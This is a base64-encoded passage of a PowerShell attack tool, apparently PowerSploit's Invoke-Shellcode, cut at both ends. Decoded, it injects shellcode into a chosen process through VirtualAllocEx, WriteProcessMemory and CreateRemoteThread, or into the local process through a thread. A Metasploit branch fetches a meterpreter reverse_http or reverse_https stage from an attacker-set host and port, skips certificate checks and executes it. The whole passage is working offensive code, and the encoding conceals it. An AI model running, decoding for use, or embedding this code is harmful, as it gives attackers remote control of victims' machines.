dWIgKz0gQ29udmVydFRvLUxpdHRsZUVuZGlhbiAkQmFzZUFkZHIgICAgICAgIyAmc2hlbGxjb2RlCiAgICAgICAgICAgICRDYWxsU3R1YiArPSAweEZGLDB4RDAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAjIENBTEwgIEVBWAogICAgICAgICAgICAkQ2FsbFN0dWIgKz0gMHg2QSwweDAwICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIyBQVVNIICBCWVRFIDAKICAgICAgICAgICAgJENhbGxTdHViICs9IDB4QjggICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICMgTU9WICAgRFdPUkQgRUFYLCAmRXhpdFRocmVhZAogICAgICAgICAgICAkQ2FsbFN0dWIgKz0gQ29udmVydFRvLUxpdHRsZUVuZGlhbiAkRXhpdFRocmVhZEFkZHIgIyAmRXhpdFRocmVhZAogICAgICAgICAgICAkQ2FsbFN0dWIgKz0gMHhGRiwweEQwICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIyBDQUxMICBFQVgKICAgICAgICB9CiAgICAgICAgCiAgICAgICAgV3JpdGUtT3V0cHV0ICRDYWxsU3R1YgogICAgfQoKICAgIGZ1bmN0aW9uIExvY2FsOkluamVjdC1SZW1vdGVTaGVsbGNvZGUgKFtJbnRdICRQcm9jZXNzSUQpCiAgICB7CiAgICAgICAgIyBPcGVuIGEgaGFuZGxlIHRvIHRoZSBwcm9jZXNzIHlvdSB3YW50IHRvIGluamVjdCBpbnRvCiAgICAgICAgJGhQcm9jZXNzID0gJE9wZW5Qcm9jZXNzLkludm9rZSgweDAwMUYwRkZGLCAkZmFsc2UsICRQcm9jZXNzSUQpICMgUHJvY2Vzc0FjY2Vzc0ZsYWdzLkFsbCAoMHgwMDFGMEZGRikKICAgICAgICAKICAgICAgICBpZiAoISRoUHJvY2VzcykKICAgICAgICB7CiAgICAgICAgICAgIFRocm93ICJVbmFibGUgdG8gb3BlbiBhIHByb2Nlc3MgaGFuZGxlIGZvciBQSUQ6ICRQcm9jZXNzSUQiCiAgICAgICAgfQoKICAgICAgICAkSXNXb3c2NCA9ICRmYWxzZQoKICAgICAgICBpZiAoJDY0Yml0Q1BVKSAjIE9ubHkgcGVyZm9ybSB0aGVzZXMgY2hlY2tzIGlmIENQVSBpcyA2NC1iaXQKICAgICAgICB7CiAgICAgICAgICAgICMgRGV0ZXJtaW5lIGlzIHRoZSBwcm9jZXNzIHNwZWNpZmllZCBpcyAzMiBvciA2NCBiaXQKICAgICAgICAgICAgJElzV293NjRQcm9jZXNzLkludm9rZSgkaFByb2Nlc3MsIFtSZWZdICRJc1dvdzY0KSB8IE91dC1OdWxsCiAgICAgICAgICAgIAogICAgICAgICAgICAjaWYgKCghJElzV293NjQpIC1hbmQgJFBvd2VyU2hlbGwzMmJpdCkKICAgICAgICAgICAgI3sKICAgICAgICAgICAgIyAgICBUaHJvdyAnVW5hYmxlIHRvIGluamVjdCA2NC1iaXQgc2hlbGxjb2RlIGZyb20gd2l0aGluIDMyLWJpdCBQb3dlcnNoZWxsLiBVc2UgdGhlIDY0LWJpdCB2ZXJzaW9uIG9mIFBvd2Vyc2hlbGwgaWYgeW91IHdhbnQgdGhpcyB0byB3b3JrLicKICAgICAgICAgICAgI30KICAgICAgICAgICAgI2Vsc2VpZiAoJElzV293NjQpICMgMzItYml0IFdvdzY0IHByb2Nlc3MKICAgICAgICAgICAgaWYgKCRJc1dvdzY0KSAjIDMyLWJpdCBXb3c2NCBwcm9jZXNzCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIGlmICgkU2hlbGxjb2RlMzIuTGVuZ3RoIC1lcSAwKQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIFRocm93ICdObyBzaGVsbGNvZGUgd2FzIHBsYWNlZCBpbiB0aGUgJFNoZWxsY29kZTMyIHZhcmlhYmxlIScKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgJFNoZWxsY29kZSA9ICRTaGVsbGNvZGUzMgogICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAnSW5qZWN0aW5nIGludG8gYSBXb3c2NCBwcm9jZXNzLicKICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgJ1VzaW5nIDMyLWJpdCBzaGVsbGNvZGUuJwogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2UgIyA2NC1iaXQgcHJvY2VzcwogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBpZiAoJFNoZWxsY29kZTY0Lkxlbmd0aCAtZXEgMCkKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICBUaHJvdyAnTm8gc2hlbGxjb2RlIHdhcyBwbGFjZWQgaW4gdGhlICRTaGVsbGNvZGU2NCB2YXJpYWJsZSEnCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICRTaGVsbGNvZGUgPSAkU2hlbGxjb2RlNjQKICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgJ1VzaW5nIDY0LWJpdCBzaGVsbGNvZGUuJwogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIGVsc2UgIyAzMi1iaXQgQ1BVCiAgICAgICAgewogICAgICAgICAgICBpZiAoJFNoZWxsY29kZTMyLkxlbmd0aCAtZXEgMCkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgVGhyb3cgJ05vIHNoZWxsY29kZSB3YXMgcGxhY2VkIGluIHRoZSAkU2hlbGxjb2RlMzIgdmFyaWFibGUhJwogICAgICAgICAgICB9CiAgICAgICAgICAgIAogICAgICAgICAgICAkU2hlbGxjb2RlID0gJFNoZWxsY29kZTMyCiAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgJ1VzaW5nIDMyLWJpdCBzaGVsbGNvZGUuJwogICAgICAgIH0KCiAgICAgICAgIyBSZXNlcnZlIGFuZCBjb21taXQgZW5vdWdoIG1lbW9yeSBpbiByZW1vdGUgcHJvY2VzcyB0byBob2xkIHRoZSBzaGVsbGNvZGUKICAgICAgICAkUmVtb3RlTWVtQWRkciA9ICRWaXJ0dWFsQWxsb2NFeC5JbnZva2UoJGhQcm9jZXNzLCBbSW50UHRyXTo6WmVybywgJFNoZWxsY29kZS5MZW5ndGggKyAxLCAweDMwMDAsIDB4NDApICMgKFJlc2VydmV8Q29tbWl0LCBSV1gpCiAgICAgICAgCiAgICAgICAgaWYgKCEkUmVtb3RlTWVtQWRkcikKICAgICAgICB7CiAgICAgICAgICAgIFRocm93ICJVbmFibGUgdG8gYWxsb2NhdGUgc2hlbGxjb2RlIG1lbW9yeSBpbiBQSUQ6ICRQcm9jZXNzSUQiCiAgICAgICAgfQogICAgICAgIAogICAgICAgIFdyaXRlLVZlcmJvc2UgIlNoZWxsY29kZSBtZW1vcnkgcmVzZXJ2ZWQgYXQgMHgkKCRSZW1vdGVNZW1BZGRyLlRvU3RyaW5nKCJYJChbSW50UHRyXTo6U2l6ZSoyKSIpKSIKCiAgICAgICAgIyBDb3B5IHNoZWxsY29kZSBpbnRvIHRoZSBwcmV2aW91c2x5IGFsbG9jYXRlZCBtZW1vcnkKICAgICAgICAkV3JpdGVQcm9jZXNzTWVtb3J5Lkludm9rZSgkaFByb2Nlc3MsICRSZW1vdGVNZW1BZGRyLCAkU2hlbGxjb2RlLCAkU2hlbGxjb2RlLkxlbmd0aCwgW1JlZl0gMCkgfCBPdXQtTnVsbAoKICAgICAgICAjIEdldCBhZGRyZXNzIG9mIEV4aXRUaHJlYWQgZnVuY3Rpb24KICAgICAgICAkRXhpdFRocmVhZEFkZHIgPSBHZXQtUHJvY0FkZHJlc3Mga2VybmVsMzIuZGxsIEV4aXRUaHJlYWQKCiAgICAgICAgaWYgKCRJc1dvdzY0KQogICAgICAgIHsKICAgICAgICAgICAgIyBCdWlsZCAzMi1iaXQgaW5saW5lIGFzc2VtYmx5IHN0dWIgdG8gY2FsbCB0aGUgc2hlbGxjb2RlIHVwb24gY3JlYXRpb24gb2YgYSByZW1vdGUgdGhyZWFkLgogICAgICAgICAgICAkQ2FsbFN0dWIgPSBFbWl0LUNhbGxUaHJlYWRTdHViICRSZW1vdGVNZW1BZGRyICRFeGl0VGhyZWFkQWRkciAzMgogICAgICAgICAgICAKICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAnRW1pdHRpbmcgMzItYml0IGFzc2VtYmx5IGNhbGwgc3R1Yi4nCiAgICAgICAgfQogICAgICAgIGVsc2UKICAgICAgICB7CiAgICAgICAgICAgICMgQnVpbGQgNjQtYml0IGlubGluZSBhc3NlbWJseSBzdHViIHRvIGNhbGwgdGhlIHNoZWxsY29kZSB1cG9uIGNyZWF0aW9uIG9mIGEgcmVtb3RlIHRocmVhZC4KICAgICAgICAgICAgJENhbGxTdHViID0gRW1pdC1DYWxsVGhyZWFkU3R1YiAkUmVtb3RlTWVtQWRkciAkRXhpdFRocmVhZEFkZHIgNjQKICAgICAgICAgICAgCiAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgJ0VtaXR0aW5nIDY0LWJpdCBhc3NlbWJseSBjYWxsIHN0dWIuJwogICAgICAgIH0KCiAgICAgICAgIyBBbGxvY2F0ZSBpbmxpbmUgYXNzZW1ibHkgc3R1YgogICAgICAgICRSZW1vdGVTdHViQWRkciA9ICRWaXJ0dWFsQWxsb2NFeC5JbnZva2UoJGhQcm9jZXNzLCBbSW50UHRyXTo6WmVybywgJENhbGxTdHViLkxlbmd0aCwgMHgzMDAwLCAweDQwKSAjIChSZXNlcnZlfENvbW1pdCwgUldYKQogICAgICAgIAogICAgICAgIGlmICghJFJlbW90ZVN0dWJBZGRyKQogICAgICAgIHsKICAgICAgICAgICAgVGhyb3cgIlVuYWJsZSB0byBhbGxvY2F0ZSB0aHJlYWQgY2FsbCBzdHViIG1lbW9yeSBpbiBQSUQ6ICRQcm9jZXNzSUQiCiAgICAgICAgfQogICAgICAgIAogICAgICAgIFdyaXRlLVZlcmJvc2UgIlRocmVhZCBjYWxsIHN0dWIgbWVtb3J5IHJlc2VydmVkIGF0IDB4JCgkUmVtb3RlU3R1YkFkZHIuVG9TdHJpbmcoIlgkKFtJbnRQdHJdOjpTaXplKjIpIikpIgoKICAgICAgICAjIFdyaXRlIDMyLWJpdCBhc3NlbWJseSBzdHViIHRvIHJlbW90ZSBwcm9jZXNzIG1lbW9yeSBzcGFjZQogICAgICAgICRXcml0ZVByb2Nlc3NNZW1vcnkuSW52b2tlKCRoUHJvY2VzcywgJFJlbW90ZVN0dWJBZGRyLCAkQ2FsbFN0dWIsICRDYWxsU3R1Yi5MZW5ndGgsIFtSZWZdIDApIHwgT3V0LU51bGwKCiAgICAgICAgIyBFeGVjdXRlIHNoZWxsY29kZSBhcyBhIHJlbW90ZSB0aHJlYWQKICAgICAgICAkVGhyZWFkSGFuZGxlID0gJENyZWF0ZVJlbW90ZVRocmVhZC5JbnZva2UoJGhQcm9jZXNzLCBbSW50UHRyXTo6WmVybywgMCwgJFJlbW90ZVN0dWJBZGRyLCAkUmVtb3RlTWVtQWRkciwgMCwgW0ludFB0cl06Olplcm8pCiAgICAgICAgCiAgICAgICAgaWYgKCEkVGhyZWFkSGFuZGxlKQogICAgICAgIHsKICAgICAgICAgICAgVGhyb3cgIlVuYWJsZSB0byBsYXVuY2ggcmVtb3RlIHRocmVhZCBpbiBQSUQ6ICRQcm9jZXNzSUQiCiAgICAgICAgfQoKICAgICAgICAjIENsb3NlIHByb2Nlc3MgaGFuZGxlCiAgICAgICAgJENsb3NlSGFuZGxlLkludm9rZSgkaFByb2Nlc3MpIHwgT3V0LU51bGwKCiAgICAgICAgV3JpdGUtVmVyYm9zZSAnU2hlbGxjb2RlIGluamVjdGlvbiBjb21wbGV0ZSEnCiAgICB9CgogICAgZnVuY3Rpb24gTG9jYWw6SW5qZWN0LUxvY2FsU2hlbGxjb2RlCiAgICB7CiAgICAgICAgaWYgKCRQb3dlclNoZWxsMzJiaXQpIHsKICAgICAgICAgICAgaWYgKCRTaGVsbGNvZGUzMi5MZW5ndGggLWVxIDApCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIFRocm93ICdObyBzaGVsbGNvZGUgd2FzIHBsYWNlZCBpbiB0aGUgJFNoZWxsY29kZTMyIHZhcmlhYmxlIScKICAgICAgICAgICAgICAgIHJldHVybgogICAgICAgICAgICB9CiAgICAgICAgICAgIAogICAgICAgICAgICAkU2hlbGxjb2RlID0gJFNoZWxsY29kZTMyCiAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgJ1VzaW5nIDMyLWJpdCBzaGVsbGNvZGUuJwogICAgICAgIH0KICAgICAgICBlbHNlCiAgICAgICAgewogICAgICAgICAgICBpZiAoJFNoZWxsY29kZTY0Lkxlbmd0aCAtZXEgMCkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgVGhyb3cgJ05vIHNoZWxsY29kZSB3YXMgcGxhY2VkIGluIHRoZSAkU2hlbGxjb2RlNjQgdmFyaWFibGUhJwogICAgICAgICAgICAgICAgcmV0dXJuCiAgICAgICAgICAgIH0KICAgICAgICAgICAgCiAgICAgICAgICAgICRTaGVsbGNvZGUgPSAkU2hlbGxjb2RlNjQKICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAnVXNpbmcgNjQtYml0IHNoZWxsY29kZS4nCiAgICAgICAgfQogICAgCiAgICAgICAgIyBBbGxvY2F0ZSBSV1ggbWVtb3J5IGZvciB0aGUgc2hlbGxjb2RlCiAgICAgICAgJEJhc2VBZGRyZXNzID0gJFZpcnR1YWxBbGxvYy5JbnZva2UoW0ludFB0cl06Olplcm8sICRTaGVsbGNvZGUuTGVuZ3RoICsgMSwgMHgzMDAwLCAweDQwKSAjIChSZXNlcnZlfENvbW1pdCwgUldYKQogICAgICAgIGlmICghJEJhc2VBZGRyZXNzKQogICAgICAgIHsKICAgICAgICAgICAgVGhyb3cgIlVuYWJsZSB0byBhbGxvY2F0ZSBzaGVsbGNvZGUgbWVtb3J5IGluIFBJRDogJFByb2Nlc3NJRCIKICAgICAgICB9CiAgICAgICAgCiAgICAgICAgV3JpdGUtVmVyYm9zZSAiU2hlbGxjb2RlIG1lbW9yeSByZXNlcnZlZCBhdCAweCQoJEJhc2VBZGRyZXNzLlRvU3RyaW5nKCJYJChbSW50UHRyXTo6U2l6ZSoyKSIpKSIKCiAgICAgICAgIyBDb3B5IHNoZWxsY29kZSB0byBSV1ggYnVmZmVyCiAgICAgICAgW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6Q29weSgkU2hlbGxjb2RlLCAwLCAkQmFzZUFkZHJlc3MsICRTaGVsbGNvZGUuTGVuZ3RoKQogICAgICAgIAogICAgICAgICMgR2V0IGFkZHJlc3Mgb2YgRXhpdFRocmVhZCBmdW5jdGlvbgogICAgICAgICRFeGl0VGhyZWFkQWRkciA9IEdldC1Qcm9jQWRkcmVzcyBrZXJuZWwzMi5kbGwgRXhpdFRocmVhZAogICAgICAgIAogICAgICAgIGlmICgkUG93ZXJTaGVsbDMyYml0KQogICAgICAgIHsKICAgICAgICAgICAgJENhbGxTdHViID0gRW1pdC1DYWxsVGhyZWFkU3R1YiAkQmFzZUFkZHJlc3MgJEV4aXRUaHJlYWRBZGRyIDMyCiAgICAgICAgICAgIAogICAgICAgICAgICBXcml0ZS1WZXJib3NlICdFbWl0dGluZyAzMi1iaXQgYXNzZW1ibHkgY2FsbCBzdHViLicKICAgICAgICB9CiAgICAgICAgZWxzZQogICAgICAgIHsKICAgICAgICAgICAgJENhbGxTdHViID0gRW1pdC1DYWxsVGhyZWFkU3R1YiAkQmFzZUFkZHJlc3MgJEV4aXRUaHJlYWRBZGRyIDY0CiAgICAgICAgICAgIAogICAgICAgICAgICBXcml0ZS1WZXJib3NlICdFbWl0dGluZyA2NC1iaXQgYXNzZW1ibHkgY2FsbCBzdHViLicKICAgICAgICB9CgogICAgICAgICMgQWxsb2NhdGUgUldYIG1lbW9yeSBmb3IgdGhlIHRocmVhZCBjYWxsIHN0dWIKICAgICAgICAkQ2FsbFN0dWJBZGRyZXNzID0gJFZpcnR1YWxBbGxvYy5JbnZva2UoW0ludFB0cl06Olplcm8sICRDYWxsU3R1Yi5MZW5ndGggKyAxLCAweDMwMDAsIDB4NDApICMgKFJlc2VydmV8Q29tbWl0LCBSV1gpCiAgICAgICAgaWYgKCEkQ2FsbFN0dWJBZGRyZXNzKQogICAgICAgIHsKICAgICAgICAgICAgVGhyb3cgIlVuYWJsZSB0byBhbGxvY2F0ZSB0aHJlYWQgY2FsbCBzdHViLiIKICAgICAgICB9CiAgICAgICAgCiAgICAgICAgV3JpdGUtVmVyYm9zZSAiVGhyZWFkIGNhbGwgc3R1YiBtZW1vcnkgcmVzZXJ2ZWQgYXQgMHgkKCRDYWxsU3R1YkFkZHJlc3MuVG9TdHJpbmcoIlgkKFtJbnRQdHJdOjpTaXplKjIpIikpIgoKICAgICAgICAjIENvcHkgY2FsbCBzdHViIHRvIFJXWCBidWZmZXIKICAgICAgICBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpDb3B5KCRDYWxsU3R1YiwgMCwgJENhbGxTdHViQWRkcmVzcywgJENhbGxTdHViLkxlbmd0aCkKCiAgICAgICAgIyBMYXVuY2ggc2hlbGxjb2RlIGluIGl0J3Mgb3duIHRocmVhZAogICAgICAgICRUaHJlYWRIYW5kbGUgPSAkQ3JlYXRlVGhyZWFkLkludm9rZShbSW50UHRyXTo6WmVybywgMCwgJENhbGxTdHViQWRkcmVzcywgJEJhc2VBZGRyZXNzLCAwLCBbSW50UHRyXTo6WmVybykKICAgICAgICBpZiAoISRUaHJlYWRIYW5kbGUpCiAgICAgICAgewogICAgICAgICAgICBUaHJvdyAiVW5hYmxlIHRvIGxhdW5jaCB0aHJlYWQuIgogICAgICAgIH0KCiAgICAgICAgIyBXYWl0IGZvciBzaGVsbGNvZGUgdGhyZWFkIHRvIHRlcm1pbmF0ZQogICAgICAgICRXYWl0Rm9yU2luZ2xlT2JqZWN0Lkludm9rZSgkVGhyZWFkSGFuZGxlLCAweEZGRkZGRkZGKSB8IE91dC1OdWxsCiAgICAgICAgCiAgICAgICAgJFZpcnR1YWxGcmVlLkludm9rZSgkQ2FsbFN0dWJBZGRyZXNzLCAkQ2FsbFN0dWIuTGVuZ3RoICsgMSwgMHg4MDAwKSB8IE91dC1OdWxsICMgTUVNX1JFTEVBU0UgKDB4ODAwMCkKICAgICAgICAkVmlydHVhbEZyZWUuSW52b2tlKCRCYXNlQWRkcmVzcywgJFNoZWxsY29kZS5MZW5ndGggKyAxLCAweDgwMDApIHwgT3V0LU51bGwgIyBNRU1fUkVMRUFTRSAoMHg4MDAwKQoKICAgICAgICBXcml0ZS1WZXJib3NlICdTaGVsbGNvZGUgaW5qZWN0aW9uIGNvbXBsZXRlIScKICAgIH0KCiAgICAjIEEgdmFsaWQgcG9pbnRlciB0byBJc1dvdzY0UHJvY2VzcyB3aWxsIGJlIHJldHVybmVkIGlmIENQVSBpcyA2NC1iaXQKICAgICRJc1dvdzY0UHJvY2Vzc0FkZHIgPSBHZXQtUHJvY0FkZHJlc3Mga2VybmVsMzIuZGxsIElzV293NjRQcm9jZXNzCiAgICBpZiAoJElzV293NjRQcm9jZXNzQWRkcikKICAgIHsKICAgICAgICAkSXNXb3c2NFByb2Nlc3NEZWxlZ2F0ZSA9IEdldC1EZWxlZ2F0ZVR5cGUgQChbSW50UHRyXSwgW0Jvb2xdLk1ha2VCeVJlZlR5cGUoKSkgKFtCb29sXSkKICAgICAgICAkSXNXb3c2NFByb2Nlc3MgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcigkSXNXb3c2NFByb2Nlc3NBZGRyLCAkSXNXb3c2NFByb2Nlc3NEZWxlZ2F0ZSkKICAgICAgICAKICAgICAgICAkNjRiaXRDUFUgPSAkdHJ1ZQogICAgfQogICAgZWxzZQogICAgewogICAgICAgICQ2NGJpdENQVSA9ICRmYWxzZQogICAgfQoKICAgIGlmIChbSW50UHRyXTo6U2l6ZSAtZXEgNCkKICAgIHsKICAgICAgICAkUG93ZXJTaGVsbDMyYml0ID0gJHRydWUKICAgIH0KICAgIGVsc2UKICAgIHsKICAgICAgICAkUG93ZXJTaGVsbDMyYml0ID0gJGZhbHNlCiAgICB9CgogICAgaWYgKCRQc0NtZGxldC5QYXJhbWV0ZXJTZXROYW1lIC1lcSAnTWV0YXNwbG9pdCcpCiAgICB7ICAgICAgICAKICAgICAgICAkUmVzcG9uc2UgPSAkVHJ1ZQogICAgICAgIAogICAgICAgIGlmICggJEZvcmNlIC1vciAoICRSZXNwb25zZSA9ICRwc0NtZGxldC5TaG91bGRDb250aW51ZSggIkRvIHlvdSBrbm93IHdoYXQgeW91J3JlIGRvaW5nPyIsCiAgICAgICAgICAgICAgICJBYm91dCB0byBkb3dubG9hZCBNZXRhc3Bsb2l0IHBheWxvYWQgJyQoJFBheWxvYWQpJyBMSE9TVD0kKCRMaG9zdCksIExQT1JUPSQoJExwb3J0KSIgKSApICkgeyB9CiAgICAgICAgCiAgICAgICAgaWYgKCAhJFJlc3BvbnNlICkKICAgICAgICB7CiAgICAgICAgICAgICMgVXNlciBvcHRlZCBub3QgdG8gY2Fycnkgb3V0IGRvd25sb2FkIG9mIE1ldGFzcGxvaXQgcGF5bG9hZC4gRXhpdCBmdW5jdGlvbgogICAgICAgICAgICBSZXR1cm4KICAgICAgICB9CiAgICAgICAgCiAgICAgICAgc3dpdGNoICgkUGF5bG9hZCkKICAgICAgICB7CiAgICAgICAgICAgICd3aW5kb3dzL21ldGVycHJldGVyL3JldmVyc2VfaHR0cCcKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgJFNTTCA9ICcnCiAgICAgICAgICAgIH0KICAgICAgICAgICAgCiAgICAgICAgICAgICd3aW5kb3dzL21ldGVycHJldGVyL3JldmVyc2VfaHR0cHMnCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICRTU0wgPSAncycKICAgICAgICAgICAgICAgICMgQWNjZXB0IGludmFsaWQgY2VydGlmaWNhdGVzCiAgICAgICAgICAgICAgICBbU3lzdGVtLk5ldC5TZXJ2aWNlUG9pbnRNYW5hZ2VyXTo6U2VydmVyQ2VydGlmaWNhdGVWYWxpZGF0aW9uQ2FsbGJhY2sgPSB7JFRydWV9CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgCiAgICAgICAgaWYgKCRMZWdhY3kpIAogICAgICAgIHsKICAgICAgICAgICAgIyBPbGQgTWV0ZXJwcmV0ZXIgaGFuZGxlciBleHBlY3RzICdJTklUTScgaW4gdGhlIFVSSSBpbiBvcmRlciB0byBpbml0aWF0ZSBzdGFnZSAwCiAgICAgICAgICAgICRSZXF1ZXN0ID0gImh0dHAkKCRTU0wpOi8vJCgkTGhvc3QpOiQoJExwb3J0KS9JTklUTSIKICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiUmVxdWVzdGluZyBtZXRlcnByZXRlciBwYXlsb2FkIGZyb20gJFJlcXVlc3QiCiAgICAgICAgfSBlbHNlIHsKCiAgICAgICAgICAgICMgR2VuZXJhdGUgYSBVUkkgdGhhdCBwYXNzZXMgdGhlIHRlc3QKICAgICAgICAgICAgJENoYXJBcnJheSA9IDQ4Li41NyArIDY1Li45MCArIDk3Li4xMjIgfCBGb3JFYWNoLU9iamVjdCB7W0NoYXJdJF99CiAgICAgICAgICAgICRTdW1UZXN0ID0gJEZhbHNlCgogICAgICAgICAgICB3aGlsZSAoJFN1bVRlc3QgLWVxICRGYWxzZSkgCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICRHZW5lcmF0ZWRVcmkgPSAkQ2hhckFycmF5IHwgR2V0LVJhbmRvbSAtQ291bnQgNAogICAgICAgICAgICAgICAgJFN1bVRlc3QgPSAoKFtpbnRbXV0gJEdlbmVyYXRlZFVyaSB8IE1lYXN1cmUtT2JqZWN0IC1TdW0pLlN1bSAlIDB4MTAwIC1lcSA5MikKICAgICAgICAgICAgfQoKICAgICAgICAgICAgJFJlcXVlc3RVcmkgPSAtam9pbiAkR2VuZXJhdGVkVXJpCgogICAgICAgICAgICAkUmVxdWVzdCA9ICJodHRwJCgkU1NMKTovLyQoJExob3N0KTokKCRMcG9ydCkvJCgkUmVxdWVzdFVyaSkiIAogICAgICAgIH0KICAgICAgICAgICAKICAgICAgICAkVXJpID0gTmV3LU9iamVjdCBVcmkoJFJlcXVlc3QpCiAgICAgICAgJFdlYkNsaWVudCA9IE5ldy1PYmplY3QgU3lzdGVtLk5ldC5XZWJDbGllbnQKICAgICAgICAkV2ViQ2xpZW50LkhlYWRlcnMuQWRkKCd1c2VyLWFnZW50JywgIiRVc2VyQWdlbnQiKQogICAgICAgIAogICAgICAgIGlmICgkUHJveHkpCiAgICAgICAgewogICAgICAgICAgICAkV2ViUHJveHlPYmplY3QgPSBOZXctT2JqZWN0IFN5c3RlbS5OZXQuV2ViUHJveHkKICAgICAgICAgICAgJFByb3h5QWRkcmVzcyA9IChHZXQtSXRlbVByb3BlcnR5IC1QYXRoICdIS0NVOlxTb2Z0d2FyZVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxJbnRlcm5ldCBTZXR0aW5ncycpLlByb3h5U2VydmVyCiAgICAgICAgICAgIAogICAgICAgICAgICAjIGlmIHRoZXJlIGlzIG5vIHByb3h5IHNldCwgdGhlbiBjb250aW51ZSB3aXRob3V0IGl0CiAgICAgICAgICAgIGlmICgkUHJveHlBZGRyZXNzKSAKICAgICAgICAgICAgewogICAgICAgICAgICAKICAgICAgICAgICAgICAgICRXZWJQcm94eU9iamVjdC5BZGRyZXNzID0gJFByb3h5QWRkcmVzcwogICAgICAgICAgICAgICAgJFdlYlByb3h5T2JqZWN0LlVzZURlZmF1bHRDcmVkZW50aWFscyA9ICRUcnVlCiAgICAgICAgICAgICAgICAkV2ViQ2xpZW50T2JqZWN0LlByb3h5ID0gJFdlYlByb3h5T2JqZWN0CiAgICAgICAgICAgIH0KICAgICAgICB9CgogICAgICAgIHRyeQogICAgICAgIHsKICAgICAgICAgICAgW0J5dGVbXV0gJFNoZWxsY29kZTMyID0gJFdlYkNsaWVudC5Eb3dubG9hZERhdGEoJFVyaSkKICAgICAgICB9CiAgICAgICAgY2F0Y2gKICAgICAgICB7CiAgICAgICAgICAgIFRocm93ICIkKCRFcnJvclswXS5FeGNlcHRpb24uSW5uZXJFeGNlcHRpb24uSW5uZXJFeGNlcHRpb24uTWVzc2FnZSkiCiAgICAgICAgfQogICAgICAgIFtCeXRlW11dICRTaGVsbGNvZGU2NCA9ICRTaGVsbGNvZGUzMgoKICAgIH0KICAgIGVsc2VpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTaGVsbGNvZGUnXSkKICAgIHsKICAgICAgICAjIFVzZXJzIHBhc3NpbmcgaW4gc2hlbGxjb2RlICB0aHJvdWdoIHRoZSAnLVNoZWxsY29kZScgcGFyYW1ldGVyIGFyZSByZXNwb25zaWJsZSBmb3IgZW5zdXJpbmcgaXQgdGFyZ2V0cwogICAgICAgICMgdGhlIGNvcnJlY3QgYXJjaGl0ZWNodHVyZSAtIHg4NiB2cy4geDY0LiBUaGlzIHNjcmlwdCBoYXMgbm8gd2F5IHRvIHZhbGlkYXRlIHdoYXQgeW91IHByb3ZpZGUgaXQuCiAgICAgICAgW0J5dGVbXV0gJFNoZWxsY29kZTMyID0gJFNoZWxsY29kZQogICAgICAgIFtCeXRlW11dICRTaGVsbGNvZGU2NCA9ICRTaGVsbGNvZGUzMgogICAgfQoKICAgIGlmICggJFBTQm91bmRQYXJhbWV0ZXJzWydQcm9jZXNzSUQnXSApCiAgICB7CiAgICAgICAgIyBJbmplY3Qgc2hlbGxjb2RlIGludG8gdGhlIHNwZWNpZmllZCBwcm9jZXNzIElECiAgICAgICAgJE9wZW5Qcm9jZXNzQWRkciA9IEdldC1Qcm9jQWRkcmVzcyBrZXJuZWwzMi5kbGwgT3BlblByb2Nlc3MKICAgICAgICAkT3BlblByb2Nlc3NEZWxlZ2F0ZSA9IEdldC1EZWxlZ2F0ZVR5cGUgQChbVUludDMyXSwgW0Jvb2xdLCBbVUludDMyXSkgKFtJbnRQdHJdKQogICAgICAgICRPcGVuUHJvY2VzcyA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldERlbGVnYXRlRm9yRnVuY3Rpb25Qb2ludGVyKCRPcGVuUHJvY2Vzc0FkZHIsICRPcGVuUHJvY2Vzc0RlbGVnYXRlKQogICAgICAgICRWaXJ0dWFsQWxsb2NFeEFkZHIgPSBHZXQtUHJvY0FkZHJlc3Mga2VybmVsMzIuZGxsIFZpcnR1YWxBbGxvY0V4CiAgICAgICAgJFZpcnR1YWxBbGxvY0V4RGVsZWdhdGUgPSBHZXQtRGVsZWdhdGVUeXBlIEAoW0ludFB0cl0sIFtJbnRQdHJdLCBbVWludDMyXSwgW1VJbnQzMl0sIFtVSW50MzJdKSAoW0ludFB0cl0pCiAgICAgICAgJFZpcnR1YWxBbGxvY0V4ID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0RGVsZWdhdGVGb3JGdW5jdGlvblBvaW50ZXIoJFZpcnR1YWxBbGxvY0V4QWRkciwgJFZpcnR1YWxBbGxvY0V4RGVsZWdhdGUpCiAg